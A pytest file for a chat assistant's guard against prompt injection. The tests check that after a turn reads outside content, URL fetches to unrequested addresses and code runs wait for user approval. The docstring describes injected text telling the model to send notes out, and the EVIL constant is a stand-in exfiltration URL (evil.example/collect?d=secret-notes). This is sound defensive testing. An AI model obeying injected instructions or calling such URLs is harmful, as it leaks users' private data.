"""Outbound calls after outside content wait for a yes (security review H2).

A page, an email or a shared file can tell the model to open
``https://evil.example/?d=<your notes>`` or to run code over your files. On
a turn that had already read outside content, ``fetch_url`` to an address
you didn't give (or this turn's search didn't find) and ``code_interpreter``
are held on the same approval card as writes. Sub-agents and headless runs
refuse instead, like held writes there.
"""
from __future__ import annotations

import uuid

import pytest

from app.chat import holds
from app.chat.tools.base import (
    HoldForApproval,
    ToolContext,
    TurnState,
    allow_urls,
    guard_outbound,
    note_sources,
    start_step,
    url_key,
    urls_in,
)
from tests.test_chat_holds import _call, _shared_note
from tests.test_chat_reliability import _drive, _enqueue, _replies
from tests.test_chat_streaming import _seed_turn

EVIL = "https://evil.example/collect?d=secret-notes"


def _ctx(turn) -> ToolContext:
    return ToolContext(db=None, user=None, conversation_id=uuid.uuid4(), user_message_id=uuid.uuid4(), turn=turn)


# ------------------------------------------------------------------ rules


def test_addresses_match_the_way_people_write_them():
    assert url_key("https://www.Example.com/a/") == url_key("example.com/a") == "example.com/a"
    assert url_key("https://example.com/a#x") == "example.com/a"
    assert url_key("https://example.com/a?q=1") != url_key("https://example.com/a")
    assert urls_in("read https://news.example.org/story, and docs.python.org/3/library/ please") == {
        "news.example.org/story",
        "docs.python.org/3/library",
    }


def test_a_trusted_turn_opens_anything():
    turn = TurnState(untrusted=False, own_attachments_only=False)
    start_step(turn, ["fetch_url"])
    guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)
    guard_outbound(_ctx(turn), "running code")


def test_a_fetch_isnt_held_by_a_page_read_in_the_same_step():
    turn = TurnState(untrusted=False, own_attachments_only=False)
    start_step(turn, ["web_search", "fetch_url"])
    assert turn["untrusted"] is True
    guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)


def test_after_outside_content_only_given_or_found_addresses_open():
    turn = TurnState(untrusted=False, own_attachments_only=False)
    allow_urls(turn, urls_in("summarise https://blog.example.com/post"))
    start_step(turn, ["web_search"])
    note_sources(turn, [{"title": "A", "url": "https://found.example.net/page"}])
    start_step(turn, ["fetch_url"])
    guard_outbound(_ctx(turn), "x", url="https://blog.example.com/post")
    guard_outbound(_ctx(turn), "x", url="http://www.found.example.net/page/")
    with pytest.raises(HoldForApproval):
        guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)


def test_code_runs_freely_on_your_own_attachments_and_its_own_output():
    turn = TurnState(untrusted=False, own_attachments_only=False)

    class _File:
        user_id = "me"

    turn.saw_files([_File()], user_id="me", in_workspace=False)
    start_step(turn, ["code_interpreter"])
    guard_outbound(_ctx(turn), "running code")
    start_step(turn, ["code_interpreter"])  # "fix the error and run it again"
    guard_outbound(_ctx(turn), "running code")
    # ...but the code's output can carry a shared file's words: opening an
    # address nobody gave still waits.
    with pytest.raises(HoldForApproval):
        guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)


def test_code_waits_after_outside_content():
    turn = TurnState(untrusted=False, own_attachments_only=False)
    start_step(turn, ["read_room"])
    start_step(turn, ["code_interpreter"])
    with pytest.raises(HoldForApproval):
        guard_outbound(_ctx(turn), "running code")


def test_a_yes_runs_it():
    turn = TurnState(user_approved=True, untrusted=True)
    guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)
    guard_outbound(_ctx(turn), "running code")


def test_a_headless_turn_without_steps_uses_what_it_has_seen():
    turn: dict = {"untrusted": True}
    with pytest.raises(HoldForApproval):
        guard_outbound(_ctx(turn), "opening evil.example", url=EVIL)


def test_the_card_names_the_site():
    assert holds.holdable("fetch_url") and holds.holdable("code_interpreter")
    q = holds.question("fetch_url", {"url": EVIL})
    assert q.startswith("Promptly wants to open evil.example") and EVIL in q
    q = holds.question("code_interpreter", {"code": "import os\nprint(os.listdir())"})
    assert "run this Python code" in q and "os.listdir" in q


async def test_the_fetch_tool_itself_holds(monkeypatch):
    from app.chat.tools import fetch_url as mod

    async def _boom(*a, **kw):  # never reached for a held call
        raise AssertionError("fetched")

    monkeypatch.setattr(mod, "safe_fetch", _boom)
    turn = TurnState(untrusted=False, own_attachments_only=False)
    start_step(turn, ["read_room"])
    start_step(turn, ["fetch_url"])
    with pytest.raises(HoldForApproval):
        await mod.FetchUrlTool().run(_ctx(turn), {"url": EVIL})


async def test_sub_agents_start_as_steered_as_their_parent(monkeypatch):
    """The parent's steered turn hands the agent a URL: the agent refuses it
    (a held call is a refusal where nobody can be asked)."""
    from app.chat import agent_runner
    from app.chat.tools import run_agents

    parent = TurnState(untrusted=False, own_attachments_only=False)
    allow_urls(parent, urls_in("look at https://ok.example.com/a"))
    start_step(parent, ["read_room"])
    start_step(parent, ["run_agents"])

    seen: dict = {}

    async def _dispatch(**kw):
        seen["turn"] = kw["ctx"].turn
        return
        yield  # pragma: no cover

    import app.chat.router as chat_router

    monkeypatch.setattr(chat_router, "_dispatch_tools", _dispatch)
    from app.models_config.provider import FinishEvent, ToolCallDelta

    async def _stream(**kw):
        yield ToolCallDelta(index=0, id="c1", name="fetch_url", arguments='{"url": "%s"}' % EVIL)
        yield FinishEvent(reason="tool_calls")

    monkeypatch.setattr(agent_runner.model_router, "stream_chat_events", _stream)

    class _P:
        id = uuid.uuid4()
        type = "openai"

    class _S:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        async def get(self, model, key):
            return _P() if model.__name__ == "ModelProvider" else object()

    monkeypatch.setattr(agent_runner, "SessionLocal", lambda: _S())
    await agent_runner.run_agent(
        user_id=uuid.uuid4(), conversation_id=uuid.uuid4(), user_message_id=uuid.uuid4(),
        task="fetch it", provider_id=uuid.uuid4(), model_id="m",
        tools_payload=[{"type": "function", "function": {"name": "fetch_url"}}],
        max_hops=2, parent_turn=parent,
    )
    sub = seen["turn"]
    start_step(sub, ["fetch_url"])
    with pytest.raises(HoldForApproval):
        guard_outbound(_ctx(sub), "x", url=EVIL)
    guard_outbound(_ctx(sub), "x", url="https://ok.example.com/a")
    assert run_agents  # the tool passes ctx.turn as parent_turn


# --------------------------------------------------------- the whole turn


async def _turn(monkeypatch, db, user, conversation, text, tool, args):
    """One chat turn whose model calls ``tool`` once, with web tools on."""
    import json

    from app.models_config.provider import FinishEvent, TextDelta, ToolCallDelta

    msg = await _seed_turn(db, conversation)
    msg.content = text
    await db.commit()
    stream_id = await _enqueue(conversation, msg, tools_enabled=True, web_search_mode="auto")
    hops: list[dict] = []

    async def _stream(**kwargs):
        hops.append(kwargs)
        if len(hops) == 1:
            yield ToolCallDelta(index=0, id="call_1", name=tool, arguments=json.dumps(args))
            yield FinishEvent(reason="tool_calls")
            return
        yield TextDelta(text="Okay.")
        yield FinishEvent(reason="stop")

    sse = "".join(await _drive(monkeypatch, user, stream_id, _stream))
    reply = (await _replies(conversation))[-1]
    return sse, hops, reply


@pytest.mark.asyncio
async def test_an_untrusted_turn_asks_before_opening_a_site(db, user, conversation, monkeypatch):
    from app.chat.tools import fetch_url as mod

    fetched: list[str] = []

    async def _fetch(method, url, **kw):
        fetched.append(url)
        raise AssertionError("must not fetch")

    monkeypatch.setattr(mod, "safe_fetch", _fetch)
    await _shared_note(db, user, conversation)
    _sse, hops, reply = await _turn(
        monkeypatch, db, user, conversation, "What does the note say?", "fetch_url", {"url": EVIL}
    )
    assert fetched == []
    meta = _call(reply, "fetch_url")["meta"]
    assert meta["approval"] == "pending" and meta["held"] == "outside_content"
    assert meta["question"].startswith("Promptly wants to open evil.example")


@pytest.mark.asyncio
async def test_an_untrusted_turn_opens_the_address_you_wrote(db, user, conversation, monkeypatch):
    from app.chat.tools import fetch_url as mod

    fetched: list[str] = []

    class _Resp:
        is_success = True
        status_code = 200
        url = "https://docs.example.com/guide"
        text = "<html><head><title>Guide</title></head><body><p>" + "Hello there. " * 40 + "</p></body></html>"

    async def _fetch(method, url, **kw):
        fetched.append(url)
        return _Resp()

    monkeypatch.setattr(mod, "safe_fetch", _fetch)
    await _shared_note(db, user, conversation)
    _sse, _hops, reply = await _turn(
        monkeypatch, db, user, conversation, "Check https://docs.example.com/guide against the note",
        "fetch_url", {"url": "https://docs.example.com/guide"},
    )
    assert fetched == ["https://docs.example.com/guide"]
    assert "approval" not in (_call(reply, "fetch_url").get("meta") or {})
